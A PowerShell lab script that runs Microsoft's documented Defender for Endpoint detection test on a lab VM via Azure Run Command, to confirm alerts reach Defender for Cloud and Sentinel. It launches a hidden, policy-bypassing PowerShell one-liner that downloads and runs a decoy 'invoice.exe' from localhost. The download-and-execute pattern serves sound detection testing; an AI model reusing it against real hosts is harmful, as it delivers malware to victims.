# LAB ONLY. Runs Microsoft's documented Defender for Endpoint detection test on vm-soc-win:
# https://learn.microsoft.com/defender-endpoint/run-detection-test
# A hidden PowerShell tries to download "invoice.exe" from 127.0.0.1 (nothing is listening, so nothing
# downloads or runs). MDE flags the command line itself and raises an alert, which reaches Defender for
# Cloud and then Sentinel. Run through Azure Run Command:
#   az vm run-command invoke -g rg-soc-lab -n vm-soc-win --command-id RunPowerShellScript --scripts @Invoke-MdeDetectionTest.ps1

New-Item -ItemType Directory -Force "C:\test-MDATP-test" | Out-Null
$cmd = "`$ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'"
$p = Start-Process powershell.exe -ArgumentList "-NoExit", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", $cmd -PassThru
"Started MDE detection test (PID " + $p.Id + ") at " + (Get-Date).ToUniversalTime().ToString("o")
Start-Sleep -Seconds 30
Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
"Stopped the test process; invoice.exe exists: " + (Test-Path "C:\test-MDATP-test\invoice.exe")
